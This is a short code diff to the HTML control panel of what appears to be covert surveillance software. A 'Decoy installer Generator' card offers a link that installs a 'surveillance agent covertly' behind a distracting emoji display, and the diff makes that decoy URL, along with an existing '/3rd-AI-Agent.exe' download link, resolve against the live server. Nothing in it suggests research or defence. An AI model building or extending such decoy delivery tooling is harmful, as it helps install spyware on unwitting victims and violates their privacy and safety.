@@ -726,7 +726,7 @@
                     <div class="card-title-custom" style="margin-bottom: 15px;"><span class="dot" style="background:#eab308; box-shadow:0 0 10px #eab308;"></span> Decoy installer Generator</div>
                     <p style="font-size: 13px; color: var(--text-dim); margin-bottom: 20px;">Use this decoy installer URL link to deploy the surveillance agent covertly. Emojis will show up during background installation.</p>
                     <div style="display: flex; gap: 10px;">
-                        <input type="text" id="decoyField" readonly class="input-custom" value="http://localhost:8081/funny-stuff">
+                        <input type="text" id="decoyField" readonly class="input-custom" value="">
                         <button class="btn-custom btn-primary-gradient" onclick="copyDecoyLink()" style="padding: 14px 20px;">Copy Link</button>
                     </div>
                 </div>
@@ -1315,6 +1315,10 @@
             const input = document.getElementById('shareLinkInput');
             if (input) {
                 input.value = window.location.origin + '/3rd-AI-Agent.exe';
+            }
+            const decoy = document.getElementById('decoyField');
+            if (decoy) {
+                decoy.value = window.location.origin + '/decoy';
             }
         })();
     </script>
